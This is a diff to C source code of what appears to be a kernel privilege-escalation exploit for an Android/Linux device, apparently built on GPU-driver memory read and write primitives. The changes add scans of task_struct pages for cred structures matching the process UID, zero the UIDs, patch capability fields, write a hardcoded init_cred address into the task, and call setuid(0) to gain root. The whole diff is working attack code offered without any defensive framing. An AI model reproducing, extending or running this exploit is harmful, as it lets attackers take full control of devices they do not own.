@@ -1269,20 +1269,39 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
         if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
             for (int off = 0; off < PAGE_SIZE - 64; off += 4) { // Scan every 4 bytes
                 uint32_t val = *(uint32_t *)(page + off);
-                
+
                 // If we find our UID (10237), it might be the start of the UID list in a cred struct
                 if (val == 10237) {
                     // Check if the next few words also look like UIDs (gid, suid, etc.)
                     uint32_t next1 = *(uint32_t *)(page + off + 4);
                     uint32_t next2 = *(uint32_t *)(page + off + 8);
                     if (next1 == 10237 && next2 == 10237) {
+                        // CRITICAL VALIDATION: Check usage field at off-4 (real cred has usage > 0)
+                        // and also verify it's not the spray memory (spray pages have NO atomic_t usage before UID)
+                        uint32_t usage_field = 0;
+                        int valid_cred = 0;
+
+                        if (off >= 4) {
+                            usage_field = *(uint32_t *)(page + off - 4);
+                            // Real cred: usage is 1..1000 (atomic_t), typically 1-10
+                            if (usage_field >= 1 && usage_field <= 100) {
+                                valid_cred = 1;
+                            }
+                        }
+
+                        if (!valid_cred) {
+                            // Skip - this is likely spray memory or task_struct fields, not cred
+                            continue;
+                        }
+
                         patch_count++;
-                        fprintf(stderr, "[PARENT] Found UID pattern at 0x%lx + 0x%x. Patching...\n", (unsigned long)va, off);
-                        
+                        fprintf(stderr, "[PARENT] Found UID pattern at 0x%lx + 0x%x (usage=%u). Patching...\n",
+                                (unsigned long)va, off, usage_field);
+
                         // 1) Zero out all UIDs (8 x u32 = uid/gid/suid/sgid/euid/egid/fsuid/fsgid)
                         uint8_t zero_creds[32] = {0};
                         gpu_write_task_virt(fd, va + off, zero_creds, 32);
-                        
+
                         // 2) Patch all 5 capability fields
                         //    Offsets relative to UID block start (off):
                         //      cap_inheritable: off + 0x24
@@ -1405,15 +1424,43 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
 
     // 3. Patch specific process credentials (most reliable)
     if (cred_ptr != 0 && task_va != 0) {
-        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x%lx, 0x%lx...\n", 
+        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x%lx, 0x%lx...\n",
                 (unsigned long)OFFSET_REAL_CRED, (unsigned long)OFFSET_CRED);
-        
+
         // Read the actual pointers from task_struct
         uint64_t rc = 0, c = 0;
         gpu_read_task_struct(fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&rc, 8);
         gpu_read_task_struct(fd, task_va + OFFSET_CRED, (uint8_t *)&c, 8);
-        
+
         fprintf(stderr, "[PARENT] real_cred: 0x%lx, cred: 0x%lx\n", (unsigned long)rc, (unsigned long)c);
+
+        // If both pointers are 0 or invalid, scan several alternate cred offsets
+        if (((c >> 48) != 0xffff) || ((rc >> 48) != 0xffff)) {
+            fprintf(stderr, "[PARENT] Primary cred offsets failed. Scanning alternate task_struct layouts...\n");
+            const uint64_t alt_offsets[] = {0x6c0, 0x6c8, 0x6d0, 0x6d8, 0x6e0, 0x6e8, 0x6f0, 0x6f8,
+                                            0x700, 0x708, 0x710, 0x718, 0x720, 0x728, 0x730, 0x738,
+                                            0x740, 0x748, 0x750, 0x758, 0x760, 0x768, 0x770, 0x778,
+                                            0x780, 0x788, 0x790, 0x798, 0x7a0, 0x7a8, 0x7b0, 0x7b8,
+                                            0x7c0, 0x7c8, 0x7d0, 0x7d8, 0x7e0, 0x7e8, 0x7f0, 0x7f8,
+                                            0x848, 0x850, 0x858, 0x860, 0x868, 0x870, 0x878, 0x880};
+            for (int i = 0; i < (int)(sizeof(alt_offsets)/sizeof(alt_offsets[0])) - 1; i++) {
+                uint64_t v1 = 0, v2 = 0;
+                gpu_read_task_struct(fd, task_va + alt_offsets[i], (uint8_t *)&v1, 8);
+                gpu_read_task_struct(fd, task_va + alt_offsets[i+1], (uint8_t *)&v2, 8);
+                if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
+                    // Check if v1 looks like a cred (read usage field)
+                    uint32_t usage = 0;
+                    if (gpu_read_task_struct(fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
+                        fprintf(stderr, "[PARENT] ALTERNATE CRED FOUND at task+0x%lx,0x%lx -> cred=0x%lx (usage=%u)\n",
+                                (unsigned long)alt_offsets[i], (unsigned long)alt_offsets[i+1],
+                                (unsigned long)v1, usage);
+                        rc = v1;
+                        c = v2;
+                        break;
+                    }
+                }
+            }
+        }
 
         if ((rc >> 48) == 0xffff) {
             patch_cred_via_gpu(fd, rc, 0);
@@ -1429,18 +1476,60 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
             if (verify_uid == 0) {
                 fprintf(stderr, "[PARENT] [+++] TARGET PROCESS ROOT CONFIRMED!\n");
             } else {
-                fprintf(stderr, "[PARENT] [!] TARGET PATCH FAILED. Trying fallback to task+0x848/0x850...\n");
-                // Fallback for different kernel variants
-                uint64_t c1, c2;
-                gpu_read_task_struct(fd, task_va + 0x848, (uint8_t *)&c1, 8);
-                gpu_read_task_struct(fd, task_va + 0x850, (uint8_t *)&c2, 8);
-                if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, c2);
-                if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, c1);
+                fprintf(stderr, "[PARENT] [!] TARGET PATCH FAILED. Trying atomic cred swap with init_cred...\n");
+                // Atomic swap: write init_cred pointer directly into task_struct
+                uint64_t init_cred_va = 0xffffffc0018f9038ULL;
+                if (gpu_write_task_virt(fd, task_va + OFFSET_CRED, (uint8_t *)&init_cred_va, 8) == 0) {
+                    fprintf(stderr, "[PARENT] [+] Wrote init_cred 0x%lx to task+0x%x\n",
+                            (unsigned long)init_cred_va, OFFSET_CRED);
+                }
+                if (gpu_write_task_virt(fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&init_cred_va, 8) == 0) {
+                    fprintf(stderr, "[PARENT] [+] Wrote init_cred 0x%lx to task+0x%x\n",
+                            (unsigned long)init_cred_va, OFFSET_REAL_CRED);
+                }
+                // Verify after swap
+                uint32_t v_uid = 0;
+                if (gpu_read_task_struct(fd, init_cred_va + 4, (uint8_t *)&v_uid, 4) == 0) {
+                    fprintf(stderr, "[PARENT] Post-swap init_cred uid: %u\n", v_uid);
+                }
             }
         }
     } else {
-        fprintf(stderr, "[PARENT] [!] task_va=0x%lx or cred_ptr=0x%lx, skipping target patch.\n", 
+        fprintf(stderr, "[PARENT] [!] task_va=0x%lx or cred_ptr=0x%lx, attempting full task scan...\n",
                 (unsigned long)task_va, (unsigned long)cred_ptr);
+
+        // FULL TASK SCAN: scan the whole 4KB page containing comm+0x818 for any valid kernel pointer pair
+        if (task_va != 0) {
+            uint64_t page_base = task_va & ~0xFFFULL;
+            uint8_t page[PAGE_SIZE];
+            if (gpu_read_task_struct(fd, page_base, page, PAGE_SIZE) == 0) {
+                fprintf(stderr, "[PARENT] Scanning page 0x%lx for cred/real_cred pair...\n", (unsigned long)page_base);
+                int found = 0;
+                for (int off = 0; off < PAGE_SIZE - 16; off += 8) {
+                    uint64_t v1 = *(uint64_t *)(page + off);
+                    uint64_t v2 = *(uint64_t *)(page + off + 8);
+                    if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
+                        uint32_t usage = 0, uid = 0;
+                        if (gpu_read_task_struct(fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
+                            gpu_read_task_struct(fd, v1 + 4, (uint8_t *)&uid, 4);
+                            fprintf(stderr, "[PARENT] Candidate pair at +0x%x,+0x%x -> cred=0x%lx (usage=%u uid=%u)\n",
+                                    off, off+8, (unsigned long)v1, usage, uid);
+                            if (uid == 10237) {
+                                fprintf(stderr, "[PARENT] [+++] FOUND OUR UID! Patching cred=0x%lx and real_cred=0x%lx\n",
+                                        (unsigned long)v1, (unsigned long)v2);
+                                patch_cred_via_gpu(fd, v1, v2);
+                                // Also write the offsets back to gbuf for child
+                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = v1;
+                                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = v2;
+                                found = 1;
+                                break;
+                            }
+                        }
+                    }
+                }
+                if (!found) fprintf(stderr, "[PARENT] No matching cred pair found in task page.\n");
+            }
+        }
     }
 
     // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
@@ -1483,31 +1572,63 @@ static void safe_cred_patch(void)
         uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
         uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
         uint64_t real_cred_ptr = *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR];
-        
+
         // If we have task_va but no cred_ptr, re-read cred from task+0x770
         if (task_va != 0 && cred_ptr == 0) {
             gpu_read_task_struct(child_fd, task_va + OFFSET_CRED, (uint8_t *)&cred_ptr, 8);
             gpu_read_task_struct(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&real_cred_ptr, 8);
         }
-        
-        fprintf(stderr, "[CHILD %d] Fallback cred_ptr=0x%lx real_cred=0x%lx\n", 
+
+        // If still no cred, scan full task page for cred pair (same as parent fallback)
+        if (task_va != 0 && cred_ptr == 0) {
+            fprintf(stderr, "[CHILD %d] Self-scanning task page for cred...\n", getpid());
+            uint64_t page_base = task_va & ~0xFFFULL;
+            uint8_t page[PAGE_SIZE];
+            if (gpu_read_task_struct(child_fd, page_base, page, PAGE_SIZE) == 0) {
+                for (int off = 0; off < PAGE_SIZE - 16; off += 8) {
+                    uint64_t v1 = *(uint64_t *)(page + off);
+                    uint64_t v2 = *(uint64_t *)(page + off + 8);
+                    if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
+                        uint32_t usage = 0, uid = 0;
+                        if (gpu_read_task_struct(child_fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
+                            gpu_read_task_struct(child_fd, v1 + 4, (uint8_t *)&uid, 4);
+                            if (uid == 10237) {
+                                fprintf(stderr, "[CHILD %d] Self-found cred at +0x%x: 0x%lx (uid=%u)\n",
+                                        getpid(), off, (unsigned long)v1, uid);
+                                cred_ptr = v1;
+                                real_cred_ptr = v2;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        fprintf(stderr, "[CHILD %d] Fallback cred_ptr=0x%lx real_cred=0x%lx\n",
                 getpid(), (unsigned long)cred_ptr, (unsigned long)real_cred_ptr);
-        
+
         if (cred_ptr != 0) {
             patch_cred_via_gpu(child_fd, cred_ptr, real_cred_ptr);
         }
-        
+
         // Try to write init_cred pointer directly into task+0x770
         // (atomic cred swap — kernel will use this cred for new operations)
         if (task_va != 0) {
             // Hardcoded init_cred from v6 log: 0xffffffc0018f9038
             uint64_t init_cred_va = 0xffffffc0018f9038ULL;
-            fprintf(stderr, "[CHILD %d] Trying atomic cred swap: task+0x%x <- 0x%lx\n", 
+            fprintf(stderr, "[CHILD %d] Trying atomic cred swap: task+0x%x <- 0x%lx\n",
                     getpid(), OFFSET_CRED, (unsigned long)init_cred_va);
             gpu_write_task_virt(child_fd, task_va + OFFSET_CRED, (uint8_t *)&init_cred_va, 8);
             gpu_write_task_virt(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&init_cred_va, 8);
+
+            // Also try alternate cred offsets
+            const uint64_t alt_offsets[] = {0x848, 0x850, 0x870, 0x878};
+            for (int i = 0; i < 4; i++) {
+                gpu_write_task_virt(child_fd, task_va + alt_offsets[i], (uint8_t *)&init_cred_va, 8);
+            }
         }
-        
+
         setuid(0);
         close(child_fd);
     }
